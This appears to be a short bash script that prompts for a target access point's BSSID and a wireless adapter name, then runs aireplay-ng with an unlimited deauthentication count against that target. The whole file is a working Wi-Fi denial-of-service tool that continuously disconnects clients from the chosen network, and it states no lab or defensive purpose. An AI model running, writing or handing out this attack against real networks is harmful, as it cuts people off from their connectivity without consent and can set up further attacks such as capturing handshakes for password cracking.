#! /bin/bash

echo "Enter BSSID of the target"
read bssid 
echo "Enter your adapter name  'ex'= wlan1 , wlan0 ,eth  "
read wlan 


sudo aireplay-ng --deauth 0 -a $bssid $wlan